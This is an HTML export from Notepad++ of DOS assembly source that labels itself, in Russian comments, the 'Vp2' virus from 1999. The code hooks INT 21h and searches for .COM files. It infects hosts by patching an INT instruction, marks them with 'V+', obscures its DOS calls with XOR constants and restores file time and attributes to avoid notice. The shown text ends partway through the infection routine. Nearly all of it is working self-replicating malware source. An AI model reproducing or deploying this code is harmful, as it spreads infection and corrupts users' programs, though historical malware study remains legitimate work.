<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Вирус Vp2 09.07.1999 (c) CrkV</span><span class="sc0">
</span><span class="sc1">;использует часть разработки [CVME] ;-)))</span><span class="sc0">

</span><span class="sc5">VP1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">
</span><span class="sc5">VP2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0">
</span><span class="sc5">VP</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0"> </span><span class="sc6">Shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">

</span><span class="sc5">DOSInt</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc5">DOSInt</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
    </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">VirVp2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">PushF</span><span class="sc0">               </span><span class="sc1">;флаги тоже cохраним</span><span class="sc0">
    </span><span class="sc6">PushA</span><span class="sc0">               </span><span class="sc1">;сохраним все регистры</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
</span><span class="sc5">Entry_Point</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">My_Point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Sp</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;получить адрес возврата</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">                      </span><span class="sc1">;Bp:=Offset My_Point</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Ofs21h</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Seg21h</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Sp</span><span class="sc4">],</span><span class="sc8">Sp</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Ss</span><span class="sc4">],</span><span class="sc8">Ss</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ss</span><span class="sc0">          </span><span class="sc1">;Cli не нужен</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Sp</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Vir_Stack</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Cld</span><span class="sc0">
    </span><span class="sc6">MovSW</span><span class="sc0">
    </span><span class="sc6">MovSB</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">My_Int21h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_Int21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Get DTA</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">

</span><span class="sc1">;   Add Si,Save_DTA</span><span class="sc0">
    </span><span class="sc6">LodSW</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">         </span><span class="sc1">;Сохраняем DTA</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;устанавливаем свою DTA</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Find_First</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Mask_Com</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@Find_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">@Check_File</span><span class="sc0">
    </span><span class="sc6">LDs</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_DTA2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Восстанавливаем программную DTA</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_Int21h</span><span class="sc0">
    </span><span class="sc6">Cli</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Sp</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Sp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ss</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Ss</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">PopA</span><span class="sc0">                </span><span class="sc1">;Восстанавливаем регистры</span><span class="sc0">
    </span><span class="sc6">PopF</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">             </span><span class="sc1">;Выходим из вируса</span><span class="sc0">

</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">@Check_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc0">     </span><span class="sc1">;Set Atr</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;найденное имя в DTA</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@Not_Infected</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc0">     </span><span class="sc1">;Open File</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@Exit_Check</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">           </span><span class="sc1">;Bx:=Ax (File Handle)</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP</span><span class="sc0">          </span><span class="sc1">;на выходе Dx:Ax - размер файла</span><span class="sc0">

    </span><span class="sc6">Or</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
    </span><span class="sc6">Jbe</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;файл маловат</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">
    </span><span class="sc6">Jnb</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;а вот этот велик ;-))</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP2</span><span class="sc0">         </span><span class="sc1">;устанавливаем ук. на конец файла - 2</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Read File</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Считаем 2 байта</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc12">'+V'</span><span class="sc0">  </span><span class="sc1">;V+ - метка вируса</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;возможно заражен</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP1</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">
</span><span class="sc5">@Not_Infected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Close File</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc0">     </span><span class="sc1">;Set Atr</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;найденное имя в DTA</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;атрибуты из DTA</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc0">     </span><span class="sc1">;Set File Time</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;время</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;дата</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
</span><span class="sc5">@Exit_Check</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Find Next</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Find_File</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Set_FP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">
</span><span class="sc5">Set_FP1</span><span class="sc4">:</span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">   
</span><span class="sc5">Set_FP2</span><span class="sc4">:</span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Read File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">;Cl=0</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Считываем 256 байт</span><span class="sc0">
    </span><span class="sc6">LodSW</span><span class="sc0">

    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Exit_Infect2</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Exit_Infect2</span><span class="sc0">

    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">         </span><span class="sc1">;Jmp short ?</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Jmp_Short</span><span class="sc0">

    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;Jmp ?  </span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Ok_Jmp</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Not_Jmp</span><span class="sc0">

</span><span class="sc5">@Jmp_Short</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LodSB</span><span class="sc0">
    </span><span class="sc6">Cbw</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Jmps</span><span class="sc0">
    

</span><span class="sc5">@Ok_Jmp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LodSW</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">

</span><span class="sc5">@Jmps</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP2</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Read File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Считаем 256 байт от перехода</span><span class="sc0">
</span><span class="sc5">@Not_Jmp</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">

</span><span class="sc5">@Next_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">
    </span><span class="sc6">Repne</span><span class="sc0">   </span><span class="sc6">ScasB</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">  </span><span class="sc5">@Ok_Scan</span><span class="sc0">

</span><span class="sc5">@Exit_Infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
</span><span class="sc5">@Exit_Infect2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">@Ok_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Now_Infected</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Now_Infected</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Now_Infected</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">@Next_Scan</span><span class="sc0">

</span><span class="sc5">@Now_Infected</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">-</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP2</span><span class="sc0">
